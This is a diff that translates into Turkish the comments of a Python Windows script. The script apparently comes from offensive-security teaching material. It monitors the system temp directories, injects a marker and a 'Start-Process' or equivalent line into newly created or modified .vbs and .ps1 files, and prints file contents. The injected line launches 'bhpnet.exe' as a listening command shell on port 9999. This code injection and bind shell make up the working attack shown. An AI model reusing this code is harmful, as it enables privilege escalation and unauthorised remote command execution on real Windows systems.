@@ -1,4 +1,4 @@
-# Modified example that is originally given here:
+# Orijinal olarak burada verilenin değiştirilmiş örneği:
 # http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
 import tempfile
 import threading
@@ -6,17 +6,17 @@ import win32file
 import win32con
 import os
 
-# these are the common temp file directories
+# ortak geçici dosya dizinleri
 dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]
 
-# file modification constants
+# dosya değiştirme sabit değişkenleri
 FILE_CREATED = 1
 FILE_DELETED = 2
 FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
-# extension based code snippets to inject
+# enjekte edilecek uzantı tabanlı kod parçacıkları
 file_types = {}
 command = "C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c"
 file_types['.vbs'] = ["\r\n'bhpmarker\r\n",
@@ -27,11 +27,11 @@ file_types['.ps1'] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]
 
 
 def inject_code(full_filename, extension, contents):
-    # is our marker already in the file?
+    # şşaretçimiz zaten dosyada mı?
     if file_types[extension][0] in contents:
         return
 
-    # no marker let's inject the marker and code
+    # işaret yoksa işaretçiyi ve kodu enjekte edelim
     full_contents = file_types[extension][0]
     full_contents += file_types[extension][1]
     full_contents += contents
@@ -46,7 +46,7 @@ def inject_code(full_filename, extension, contents):
 
 
 def start_monitor(path_to_watch):
-    # we create a thread for each monitoring run
+    # her monitoring çalıştığında bir thread oluşturuyoruz
     file_list_directory = 0x0001
 
     h_directory = win32file.CreateFile(
@@ -86,7 +86,7 @@ def start_monitor(path_to_watch):
                 elif action == FILE_MODIFIED:
                     print("[ * ] Modified %s" % full_filename)
 
-                    # dump out the file contents
+                    # dosya içeriğini boşalt
                     print("[vvv] Dumping contents...")
 
                     try:
